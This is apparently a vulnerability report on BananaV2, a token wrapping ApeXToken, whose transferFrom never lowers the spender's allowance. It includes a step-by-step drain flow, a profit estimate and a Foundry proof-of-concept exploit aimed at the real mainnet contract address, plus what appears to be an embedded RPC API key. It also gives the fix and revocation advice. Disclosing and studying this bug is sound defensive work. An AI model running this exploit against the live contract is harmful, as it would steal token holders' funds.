# Combined Analysis: BananaV2 + ApeXToken Allowance Vulnerability

## Contract Addresses

| Contract | Address | Allowance Implementation | Status |
|----------|---------|-------------------------|--------|
| **ApeXToken** | `0x52a8845df664d76c69d2eea607cd793565af42b8` | OpenZeppelin ERC20 | **CORRECT** |
| **BananaV2** | `0x93fa1d7c310692eaf390f951828f8791bc19cb36` | Custom (buggy) | **VULNERABLE** |

---

## Storage Analysis Comparison

### ApeXToken (CORRECT)

```
| ERC20.transferFrom | ERC20._allowances, ERC20._balances | ERC20._allowances, ERC20._balances |
```
- **Reads**: `_allowances`, `_balances`
- **Writes**: `_allowances`, `_balances`

**Allowance is correctly decremented after spend.**

### BananaV2 (VULNERABLE)

```
| BananaV2.transferFrom | BananaV2.allowance, BananaV2.balanceOf | BananaV2.balanceOf |
```
- **Reads**: `allowance`, `balanceOf`
- **Writes**: `balanceOf` only

**Allowance is NEVER decremented after spend!**

---

## The Bug in Detail

### BananaV2 `_spendAllowance` (Line 116)

```solidity
function _spendAllowance(
    address from,      // Token holder
    address spender,   // Spender
    uint256 value
) internal virtual {
    uint256 currentAllowance = allowance[from][spender];  // Reads from[spender]
    if (currentAllowance != type(uint256).max) {
        require(currentAllowance >= value, "insufficient allowance");
        unchecked {
            _approve(owner, spender, currentAllowance - value);  // BUG: writes owner[spender]!
        }
    }
}
```

### ApeXToken `transferFrom` (OpenZeppelin - CORRECT)

```solidity
function transferFrom(
    address sender,
    address recipient,
    uint256 amount
) public virtual override returns (bool) {
    _transfer(sender, recipient, amount);

    uint256 currentAllowance = _allowances[sender][_msgSender()];  // Reads sender[spender]
    require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
    unchecked {
        _approve(sender, _msgSender(), currentAllowance - amount);  // CORRECT: writes sender[spender]
    }

    return true;
}
```

---

## Attack Flow: Drain ApeXToken via BananaV2

### Background

BananaV2 is a wrapper token for ApeXToken:
- `mint()`: Deposit ApeXToken → Receive BANANA
- `redeem()`: Burn BANANA → Receive ApeXToken

### Attack Steps

```
┌────────────────────────────────────────────────────────────────────┐
│                    COMPLETE ATTACK FLOW                            │
├────────────────────────────────────────────────────────────────────┤
│                                                                    │
│  1. VICTIM approves ATTACKER for N BANANA tokens                   │
│     └── BananaV2.approve(attacker, N)                              │
│                                                                    │
│  2. ATTACKER drains VICTIM's BANANA (using allowance bug)          │
│     └── Loop: BananaV2.transferFrom(victim, attacker, N)           │
│         └── Allowance never decrements!                            │
│         └── Repeat until victim.balance == 0                       │
│                                                                    │
│  3. ATTACKER redeems stolen BANANA for ApeXToken                   │
│     └── BananaV2.redeem(stolenAmount)                              │
│         └── Receives proportional ApeXToken                        │
│                                                                    │
│  4. PROFIT: Attacker now has ApeXToken (underlying asset)          │
│                                                                    │
└────────────────────────────────────────────────────────────────────┘
```

### Economic Model

```
Attacker Requirements:
- Any approval from a BANANA holder
- Gas cost: ~65,000 gas per transferFrom
- Iterations needed: victim_balance / approval_amount

Profit Calculation:
- Gross: victim's entire BANANA balance (redeemable for ApeXToken)
- Cost: (iterations * 65000 * gas_price) + redeem_gas
- Net: BANANA_value - gas_costs ≈ nearly 100% of victim's value

Example:
- Victim has 10,000 BANANA, approves attacker for 100
- Attacker needs 100 transferFrom calls
- Gas cost: 100 * 65000 * 20 gwei = 0.13 ETH
- If BANANA worth > 0.13 ETH total, attack is profitable
```

---

## Proof of Concept: Full ApeXToken Theft

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IBananaV2 {
    function balanceOf(address) external view returns (uint256);
    function allowance(address, address) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function redeem(uint256 amount) external returns (uint256);
    function redeemTime() external view returns (uint256);
    function apeXToken() external view returns (address);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

contract FullApeXTheftTest is Test {
    IBananaV2 banana = IBananaV2(0x93fa1d7c310692eaf390f951828f8791bc19cb36);
    IERC20 apex;

    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.createSelectFork("https://eth-mainnet.g.alchemy.com/v2/pLXdY7rYRY10SH_UTLBGH");
        apex = IERC20(banana.apeXToken());

        // Give victim BANANA tokens
        deal(address(banana), victim, 10000 ether);
    }

    function test_fullApeXTheft() public {
        console.log("=== Full ApeXToken Theft via BananaV2 Bug ===");
        console.log("ApeXToken address:", address(apex));

        uint256 victimBananaBefore = banana.balanceOf(victim);
        console.log("Victim BANANA before:", victimBananaBefore);

        // Step 1: Victim approves attacker for small amount
        vm.prank(victim);
        banana.approve(attacker, 100 ether);
        console.log("Victim approved attacker for: 100 BANANA");

        // Step 2: Attacker exploits bug to drain all BANANA
        uint256 drainIterations = victimBananaBefore / 100 ether;
        console.log("Drain iterations needed:", drainIterations);

        for (uint256 i = 0; i < drainIterations; i++) {
            vm.prank(attacker);
            banana.transferFrom(victim, attacker, 100 ether);
        }

        console.log("\n=== After BANANA Drain ===");
        console.log("Victim BANANA after:", banana.balanceOf(victim));
        console.log("Attacker BANANA:", banana.balanceOf(attacker));

        // Step 3: Warp to redeem time and redeem for ApeXToken
        vm.warp(banana.redeemTime() + 1);

        uint256 attackerBanana = banana.balanceOf(attacker);
        uint256 attackerApexBefore = apex.balanceOf(attacker);

        vm.prank(attacker);
        uint256 apexReceived = banana.redeem(attackerBanana);

        console.log("\n=== After Redeem to ApeXToken ===");
        console.log("Attacker received ApeXToken:", apexReceived);
        console.log("Attacker ApeXToken balance:", apex.balanceOf(attacker));

        // Verify theft complete
        assertEq(banana.balanceOf(victim), 0, "Victim drained of BANANA");
        assertGt(apex.balanceOf(attacker), 0, "Attacker has ApeXToken");
    }
}
```

---

## Risk Assessment

### Who is at Risk?

1. **Any BANANA holder who has approved any address**
   - Their entire BANANA balance can be drained
   - This converts to loss of their underlying ApeXToken value

2. **Users who approved BananaV2-related contracts**
   - DEX routers, aggregators, etc.
   - If any approved contract is exploitable, BANANA can be stolen

### TVL at Risk

```
BananaV2 Contract: 0x93fa1d7c310692eaf390f951828f8791bc19cb36
  └── Holds ApeXToken as backing asset
  └── All BANANA holders' value at risk

ApeXToken Contract: 0x52a8845df664d76c69d2eea607cd793565af42b8
  └── NOT directly vulnerable
  └── But can be stolen through BananaV2 attack vector
```

---

## Traverse Tools Evidence

### BananaV2 Call Graph (sol2cg)

```
n81 -> n53 [label="(owner, spender, currentAllowance - value)\n6"];
```
Shows `owner` variable passed instead of `from` parameter.

### BananaV2 Storage Analysis (sol-storage-analyzer)

```
| BananaV2.transferFrom | BananaV2.allowance, BananaV2.balanceOf | BananaV2.balanceOf |
```
`transferFrom` reads but does NOT write to `allowance`.

### ApeXToken Storage Analysis (sol-storage-analyzer)

```
| ERC20.transferFrom | ERC20._allowances, ERC20._balances | ERC20._allowances, ERC20._balances |
```
Correctly reads AND writes `_allowances`.

---

## Mitigation

### For BananaV2 Team

1. **Emergency pause** if available
2. **Notify users** to revoke all BANANA approvals
3. **Deploy patched contract**:
   ```solidity
   // Fix line 116: change from
   _approve(owner, spender, currentAllowance - value);
   // To
   _approve(from, spender, currentAllowance - value);
   ```
4. **Migrate funds** to new contract

### For Users

1. **Immediately revoke** all BANANA token approvals
2. **Check** https://revoke.cash for active approvals
3. **Do not** approve any new spenders until fixed

---

## Classification

- **Severity**: CRITICAL
- **CWE**: CWE-682 (Incorrect Calculation)
- **Impact**: Complete loss of funds for any user with active approval
- **Likelihood**: HIGH (trivial to exploit)
